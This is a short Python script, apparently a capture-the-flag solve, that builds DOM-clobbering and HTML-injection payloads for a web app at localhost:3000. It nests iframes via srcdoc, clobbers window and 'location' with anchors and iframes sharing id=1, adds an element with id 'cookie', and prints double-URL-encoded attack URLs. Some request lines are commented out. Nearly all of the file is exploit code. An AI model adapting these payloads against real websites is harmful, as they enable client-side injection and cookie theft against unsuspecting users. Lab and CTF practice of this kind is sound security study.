import urllib.parse
import requests

target = 'window1[wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW][wInDoW];'
n1=target.count('[wInDoW]')

TARGET_URL = 'http://localhost:3000'
def getFrame(view,window):
    view=urllib.parse.quote_plus(view)
    payload=f"</div><a id=1><iframe id=1 src=\"{TARGET_URL}/?view={view}&window={window}\"></iframe>"
    return payload


d = getFrame('http://localhost:3000?window=2',window='testavava')
d = f"</div><iframe srcdoc=\"{d}\"></iframe>"
print(d)

def getUrl(view,window):
    print(urllib.parse.unquote_plus(f"{TARGET_URL}/?view={view}&window={window}"))
    #res = requests.get(f"{TARGET_URL}/?view={view}&cookie={cookie}&window={window}")
    #print(res.text)

getUrl(urllib.parse.quote_plus(urllib.parse.quote_plus(f'{d}')),'test')
#getUrl(urllib.parse.quote_plus(urllib.parse.quote_plus('<iframe name=1 ></iframe><iframe name=1 ></iframe><p id=cookie ></p>')),'test')
#getUrl(urllib.parse.quote_plus(urllib.parse.quote_plus('<a id=1 name=location href="https://example.com/"><iframe id=1 ></iframe><a id=1><p id=cookie ></p>')),'test')
